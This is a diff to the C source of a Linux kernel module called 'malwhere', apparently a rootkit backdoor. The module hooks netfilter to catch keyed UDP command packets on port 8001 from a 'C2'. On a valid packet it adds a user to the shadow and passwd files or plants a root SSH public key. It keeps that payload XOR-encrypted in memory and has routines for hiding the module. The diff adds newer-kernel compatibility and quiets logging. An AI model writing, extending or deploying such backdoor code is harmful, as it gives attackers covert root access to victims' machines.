@@ -1,4 +1,5 @@
 #include <linux/init.h>
+#include <linux/version.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/file.h>
@@ -37,13 +38,13 @@
 #include "sensitive.h"
 
 #define DEFAULT_KEY 97425196
-#define KEY_STR_LEN 10
+#define KEY_STR_LEN 8
 #define CMD_ADD_USER   1
 #define CMD_ADD_PUBKEY 2
 
 int cur_key = 0;
-int new_key = DEFAULT_KEY; // Initialize encryption key with at least someting
-static int debug_output = 0;
+int new_key = DEFAULT_KEY; // Initialize encryption key with at least something
+int debug_output = 0;
 char *module_str = "malwhere";
 unsigned char *nfhook_deep_space = NULL;
 struct nf_hook_ops nfho;
@@ -98,18 +99,16 @@ void rm_mod_from_ddebug_tables(void) {
  *       In practice, commands should come from a race-free source.
  */
 struct command *get_command(unsigned char *data, size_t len) {
-  printk(KERN_ALERT "get_command()");
+  if (debug_output) printk(KERN_ALERT "get_command()");
   char initiation[] = {0x6b,0x65,0x79};
-  char action = 0;
   int i = 0;
   char intbuf[KEY_STR_LEN+1];
 
   // Perform length check immediately to improve performance in the likely case
   // that the packet is not from C2. 
   size_t cmd_pkt_len = sizeof(initiation) + 1 + KEY_STR_LEN + 1 + KEY_STR_LEN + 1 + 1;
-  printk(KERN_ALERT "%d==%d ?\n", len, cmd_pkt_len);
   if (likely(len != cmd_pkt_len)){
-    debug_output && printk(KERN_ALERT "Packet len didn't match\n");
+    if (debug_output) printk(KERN_ALERT "Packet len didn't match: %d != %d\n", len, cmd_pkt_len);
     return NULL;
   }
 
@@ -123,10 +122,10 @@ struct command *get_command(unsigned char *data, size_t len) {
     return NULL;
 
   if (memcmp(data, initiation, sizeof(initiation)) != 0) {
-    debug_output && printk(KERN_ALERT "Key doesn't match\n");
+    if (debug_output) printk(KERN_ALERT "Key doesn't match\n");
     return NULL;
   }
-  debug_output && printk(KERN_ALERT "Key matches\n");
+  if (debug_output) printk(KERN_ALERT "Key matches\n");
 
   // Copy in current key from the command packet
   for (i = 0; i < KEY_STR_LEN; i++)
@@ -135,6 +134,7 @@ struct command *get_command(unsigned char *data, size_t len) {
   intbuf[KEY_STR_LEN] = '\0';
   if (kstrtouint(intbuf, 10, &cmd->cur_key) < 0) {
     if (cmd) kfree(cmd);
+    if (debug_output) printk(KERN_ALERT "bad number though\n");
     return NULL;
   }
 
@@ -171,7 +171,11 @@ int is_add_pubkey(struct command *cmd) {
   return cmd && cmd->action & CMD_ADD_PUBKEY;
 }
 
-static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 1, 0)
+  static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
+#else
+  static unsigned int nfhook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
+#endif
   const struct sk_buff *this_skb = skb;
   struct iphdr *this_iphdr;
   struct udphdr *this_udphdr;
@@ -186,30 +190,30 @@ static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const stru
 
   this_iphdr = (struct iphdr *) skb_network_header(this_skb);
   if (this_iphdr && this_iphdr->protocol == IPPROTO_UDP) {
-    this_udphdr = skb_transport_header(this_skb);
+    this_udphdr = (struct udphdr *) skb_transport_header(this_skb);
     udphdr_len = sizeof(struct udphdr);
-    debug_output && printk(KERN_ALERT "Got UDP. Looking for port %d", ntohs(this_udphdr->dest));
+    if (debug_output) printk(KERN_ALERT "Got UDP. Looking for port %d", ntohs(this_udphdr->dest));
     if (ntohs(this_udphdr->dest) == 8001) {
-      debug_output && printk(KERN_ALERT "UDP/8001");
+      if (debug_output) printk(KERN_ALERT "UDP/8001");
       data = skb->data + ip_hdrlen(skb) + sizeof(struct udphdr);
       pkt_len = skb->len - ip_hdrlen(skb) - sizeof(struct udphdr);
-      debug_output && printk(KERN_ALERT "PACKET (%d bytes)", pkt_len);
+      if (debug_output) printk(KERN_ALERT "PACKET (%d bytes)", pkt_len);
 
       if ((cmd = get_command(data, pkt_len)) == NULL){
-        printk(KERN_ALERT "Got NULL from get_command()\n");
+        if (debug_output) printk(KERN_ALERT "Got NULL from get_command()\n");
         goto accept;
       }
       
       // Command packet is valid, process the action.
       if (is_add_user(cmd)) {
-        debug_output && printk(KERN_ALERT "Will add user");
+        if (debug_output) printk(KERN_ALERT "Will add user");
         schedule_work(&wq_add_user);
       } else if (is_add_pubkey(cmd)) {
-        debug_output && printk(KERN_ALERT "Will add pubkey");
+        if (debug_output) printk(KERN_ALERT "Will add pubkey");
         schedule_work(&wq_add_root_pubkey);
       } else {
         // Action is invalid.
-        debug_output && printk(KERN_ALERT "Got command packet with bad action %x\n", cmd->action);
+        if (debug_output) printk(KERN_ALERT "Got command packet with bad action %x\n", cmd->action);
         goto accept;
       }
 
@@ -262,7 +266,7 @@ void xor_range(unsigned char *addr, size_t len, unsigned int k) {
 
 // Align SENSITIVE_LEN on key-length boundary to ensure no over-encryption.
 size_t encrypt_len(unsigned int k) {
-  debug_output && printk(KERN_ALERT "encrypt_len: %d", SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k)));
+  if (debug_output) printk(KERN_ALERT "encrypt_len: %d", SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k)));
   return SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k));
 }
 
@@ -276,13 +280,13 @@ void encrypt_payload(void) {
     return;
   xor_range((unsigned char *)add_file_line, encrypt_len(new_key), new_key);
   atomic_set(&payload_encrypted, 1);
-  new_key = 0;
+  new_key = 0;  // keep the key out of memory.
 }
 
 /* Always decrypt with the current key. Since this key is thrown away after
  * every decryption, we assume that if the command packet came in with the
  * correct initiation key, that the packet contains the correct current key.
- * If not, the kernel will at least oops.
+ * If not, the kernel will likely oops.
  */
 void decrypt_payload(void) {
   if (!is_payload_encrypted())
@@ -294,7 +298,7 @@ void decrypt_payload(void) {
 }
 
 // Work queue task
-void wq_task_add_user(void *data) {
+void wq_task_add_user(struct work_struct *work) {
   int ret;
   decrypt_payload();
   // If adding the user to the shadow file succeeds, but addition to the passwd file fails,
@@ -302,37 +306,39 @@ void wq_task_add_user(void *data) {
   // passwd is probably better than vice versa. Or just stop being lazy and remove the line from
   // shadow in this error case. Eh maybe later.
   if ((ret = add_user_shadow()) < 0) {
-    printk(KERN_ALERT "error: work_add_user: shadow: %d\n", ret);
+    if (debug_output) printk(KERN_ALERT "error: work_add_user: shadow: %d\n", ret);
   }
   else if ((ret = add_user_passwd()) < 0) {
-    printk(KERN_ALERT "error: work_add_user: passwd: %d\n", ret);
+    if (debug_output) printk(KERN_ALERT "error: work_add_user: passwd: %d\n", ret);
   }
   encrypt_payload();
 }
 
 // Work queue task
-void wq_task_add_root_pubkey(void *data) {
+void wq_task_add_root_pubkey(struct work_struct *work) {
   int ret;
   decrypt_payload();
   if ((ret = add_root_pubkey()) < 0)
-    printk(KERN_ALERT "error: work_add_root_pubkey: %d\n", ret);
+    if (debug_output) printk(KERN_ALERT "error: work_add_root_pubkey: %d\n", ret);
   encrypt_payload();
 }
 
 static int __init init(void) {
   encrypt_payload();
-  debug_output && printk(KERN_INFO, "Setting nfhook");
+  if (debug_output) printk(KERN_INFO, "Setting nfhook");
   set_nf_hook();
+  /*
   rm_mod_from_list();
   rm_mod_from_ddebug_tables();
   rm_mod_from_sysfs();
+  */
   return 0;
 }
 
 static void __exit exit(void) {
-  printk(KERN_INFO "[%s] exiting\n", module_str);
+  if (debug_output) printk(KERN_INFO "[%s] exiting\n", module_str);
   unset_nf_hook();
-  printk(KERN_INFO "[%s] exited\n", module_str);
+  if (debug_output) printk(KERN_INFO "[%s] exited\n", module_str);
 }
 
 module_init(init);
